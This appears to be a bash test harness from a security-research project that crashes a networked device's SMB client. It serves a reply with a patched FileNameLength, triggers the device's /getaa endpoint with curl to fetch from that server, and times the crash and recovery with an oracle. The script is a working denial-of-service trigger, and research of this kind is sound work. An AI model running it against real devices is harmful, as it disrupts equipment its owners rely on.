#!/bin/bash
# One measured SMB-crash case: serve a patched QUERY_INFO body, poll /status/zp
# at 100 ms with crash_oracle, fire the /getaa at t=3 s, and keep the oracle
# running for 22 s so the recovery is timed too.
#
# usage: smb_outage.sh HOST PORT VALUE [TAG]
#   VALUE is the FileNameLength written at reply offset 96 (see smbserv_body.py)
#   TAG defaults to VALUE and names the output files
#
# Output: /tmp/oracle_<TAG>_<run>.jsonl (transitions), /tmp/atk_<TAG>_<run>.txt,
# /tmp/smb_<TAG>_<run>.log. Needs impacket in captures/research/venv and
# ~/smbshare/real.jpg.
set -u
H=${1:?host}; P=${2:?port}; V=${3:?value}; TAG=${4:-$3}
RUN=$(date +%H%M%S)
VZ=/Users/jemanuel/projects/frankensonos/captures/research/venv/bin/python
RECON=/Users/jemanuel/projects/frankensonos/recon
OUT=/tmp/oracle_${TAG}_${RUN}.jsonl

$VZ "$RECON/smbserv_body.py" "$P" 96 "$V" > "/tmp/smb_${TAG}_${RUN}.log" 2>&1 &
SRV=$!
sleep 1.5
python3 "$RECON/crash_oracle.py" --host "$H" --duration 22 --jsonl "$OUT" \
    > "/tmp/or_${TAG}_${RUN}.txt" 2>&1 &
ORC=$!
sleep 3
curl -s -m 20 -o /dev/null -w 'getaa=%{http_code} t=%{time_total}\n' \
    "http://$H:1400/getaa?u=x-file-cifs://192.168.4.160:$P/SHARE/real.jpg" \
    > "/tmp/atk_${TAG}_${RUN}.txt" 2>&1
wait $ORC
kill $SRV 2>/dev/null
echo "$TAG $RUN $(cat "/tmp/atk_${TAG}_${RUN}.txt") $(tail -1 "$OUT")"
